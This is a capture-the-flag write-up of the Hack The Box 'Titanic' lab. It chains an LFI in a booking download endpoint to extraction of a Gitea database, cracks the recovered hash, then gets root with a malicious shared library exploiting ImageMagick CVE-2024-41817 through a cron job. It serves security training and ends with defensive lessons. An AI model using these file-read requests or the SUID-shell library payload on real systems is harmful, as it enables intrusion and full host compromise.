# HTB Write-Up: Titanic

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Titanic)    |
| Difficulty | Easy                                                           |
| OS         | Linux                                                          |
| Author     | Landau                                                         |
| Date       | April 20, 2026                                                 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Web Application & Subdomain Discovery](#2-enumeration--web-application--subdomain-discovery)
3. [Initial Access — LFI to Gitea Database Extraction & Hash Cracking](#3-initial-access--lfi-to-gitea-database-extraction--hash-cracking)
4. [Privilege Escalation — ImageMagick CVE-2024-41817 via Cron Job](#4-privilege-escalation--imagemagick-cve-2024-41817-via-cron-job)
5. [Summary](#5-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for rapid initial discovery:

```bash
rustscan -a 10.129.231.221 --ulimit 5000
```

**Open Ports:**

| Port | Service | Notes                                          |
|------|---------|------------------------------------------------|
| 22   | SSH     | OpenSSH — available for post-exploitation      |
| 80   | HTTP    | Web application — domain: `titanic.htb`        |

A minimal attack surface with only two ports exposed. The web application on port 80 is the primary entry point.

---

## 2. Enumeration — Web Application & Subdomain Discovery

### 2.1 — Directory Enumeration

Content discovery was run against the web root:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt \
     -u http://titanic.htb/FUZZ
```

**Findings:**

| Path           | Status | Notes                                             |
|----------------|--------|---------------------------------------------------|
| /book          | 405    | Method Not Allowed — endpoint exists but POST only|
| /server-status | 403    | Apache status page                                |

The `/book` endpoint returning a `405 Method Not Allowed` indicates it is a POST-only API endpoint, consistent with a booking form. Interacting with the "Book a Trip" button on the homepage via Burp Suite revealed that submitting the form returns a JSON file download — and the download request contains a `ticket` parameter specifying the file path.

### 2.2 — Subdomain Enumeration

Virtual host fuzzing revealed a hidden subdomain:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -u http://titanic.htb \
     -H "Host: FUZZ.titanic.htb" \
     -fc 301
```

**Result:**

```
dev    [Status: 200, Size: 13982]
```

`dev.titanic.htb` hosts a **Gitea** instance — a self-hosted Git service. While no immediate credentials were available to log in, the presence of a Gitea instance is significant: it may expose source code, configuration files, or credentials through its repositories or administrative interface.

---

## 3. Initial Access — LFI to Gitea Database Extraction & Hash Cracking

### 3.1 — Local File Inclusion via Ticket Parameter

Analysis of the booking download request in Burp Suite revealed that the `ticket` parameter directly controls which file the server returns:

```
GET /download?ticket=/etc/passwd HTTP/1.1
```

The server responded with the contents of `/etc/passwd`, confirming an unauthenticated **Local File Inclusion (LFI)** vulnerability with no path traversal restrictions. Any file readable by the web application process could be exfiltrated.

### 3.2 — Locating the Gitea Database

Source code or configuration files accessible through the LFI were used to identify the Gitea data path. The Docker Compose configuration revealed the default Gitea database location:

```
GET /download?ticket=/home/developer/gitea/data/gitea.db HTTP/1.1
```

The SQLite database file was successfully downloaded.

### 3.3 — Extracting the Password Hash

The downloaded `gitea.db` was queried locally using `sqlite3` to extract user credentials from the `user` table:

```bash
sqlite3 gitea.db "SELECT name, passwd, salt FROM user;"
```

The `developer` account's password was stored as a **PBKDF2-HMAC-SHA256** hash with 50,000 iterations:

```
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

### 3.4 — Cracking the Hash with Hashcat

The hash was cracked using **Hashcat mode 10900** (PBKDF2-HMAC-SHA256) against the rockyou wordlist:

```bash
hashcat -m 10900 -a 0 hash /usr/share/wordlists/rockyou.txt
```

**Result — cracked in under 10 seconds:**

```
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
Status: Cracked
```

Password recovered: **`25282528`**

### 3.5 — SSH Access as `developer`

```bash
ssh developer@titanic.htb
# Password: 25282528
```

**User flag retrieved from `/home/developer/user.txt`.**

---

## 4. Privilege Escalation — ImageMagick CVE-2024-41817 via Cron Job

### 4.1 — Discovering a Root-Owned Cron Script

Post-exploitation enumeration of `/opt` revealed a non-default `scripts` directory owned by root:

```bash
ls -la /opt/scripts/
# -rwxr-xr-x 1 root root  167 Feb  3  2025 identify_images.sh
```

```bash
cat /opt/scripts/identify_images.sh
```

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

This script is executed periodically by root via cron. It calls `/usr/bin/magick identify` against all JPEG files in a directory that the `developer` user has write access to. The working directory is set to `/opt/app/static/assets/images` before execution — which is significant for the exploit.

### 4.2 — Identifying the Vulnerability

The installed ImageMagick version was checked:

```bash
magick --version
# Version: ImageMagick 7.1.1-35
```

**ImageMagick 7.1.1-35** is affected by **CVE-2024-41817** — a vulnerability in the way ImageMagick resolves shared libraries. When `magick` is executed, it searches for shared libraries in the current working directory before system paths. Since the cron script sets the working directory to a developer-writable location, a malicious shared library placed there will be loaded by the root-owned `magick` process.

### 4.3 — Crafting the Malicious Shared Library

A shared library was compiled with a constructor function — code that executes automatically when the library is loaded — that copies `/bin/sh` to `/tmp` and sets the SUID bit on it:

```bash
gcc -x c -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("cp /bin/sh /tmp && chmod u+s /tmp/sh");
    exit(0);
}
EOF
```

The library was written directly to the images directory — the same directory `magick` will use as its working directory when the cron job executes.

### 4.4 — Obtaining a Root Shell

Once the cron job fired and loaded the malicious library, `/tmp/sh` was present with the SUID bit set. The `-p` flag preserves the effective UID (root) when spawning the shell:

```bash
/tmp/sh -p
# whoami
root
```

**Root flag retrieved from `/root/root.txt`.**

---

## 5. Summary

| Phase                   | Technique                                                               | Result                              |
|-------------------------|-------------------------------------------------------------------------|-------------------------------------|
| Recon                   | RustScan                                                                | Ports 22 and 80 identified          |
| Enumeration             | ffuf — directory and subdomain fuzzing                                  | `dev.titanic.htb` (Gitea) discovered|
| LFI Discovery           | `ticket` parameter path traversal in booking download endpoint          | Arbitrary file read confirmed       |
| Database Exfiltration   | LFI → `gitea.db` downloaded                                            | PBKDF2 hash for `developer` extracted|
| Hash Cracking           | Hashcat mode 10900 (PBKDF2-HMAC-SHA256)                                | Password `25282528` recovered       |
| Initial Access          | SSH with cracked credentials                                            | Shell as `developer`; user flag     |
| Privilege Escalation    | CVE-2024-41817 — malicious `.so` in ImageMagick working directory      | Root shell via SUID `/tmp/sh`       |

### Key Takeaways

- **File path parameters must never be passed directly to file system operations.** The `ticket` parameter's value was used without sanitisation to read arbitrary files from the server. All file retrieval endpoints must validate and canonicalise paths, restricting access to a specific safe directory using allowlists rather than denylists.
- **Internal services exposed on the same host inherit the application's attack surface.** The Gitea instance at `dev.titanic.htb` was only reachable because its database path was discoverable through application configuration files — which were themselves readable via the LFI. A single vulnerability chained into full credential exposure.
- **PBKDF2 with a weak password provides no meaningful protection.** Despite 50,000 iterations, the password `25282528` was cracked in under 10 seconds because it appeared early in the rockyou wordlist. Strong hashing algorithms only protect strong passwords — enforcing password complexity policies is equally important.
- **Cron jobs that invoke binaries in user-writable working directories are a shared-library hijacking risk.** CVE-2024-41817 exploits the dynamic linker's directory search order. Any root-owned process that changes to a user-writable directory before loading shared libraries is potentially vulnerable. Cron scripts should use absolute library paths and run from directories with restricted write permissions.
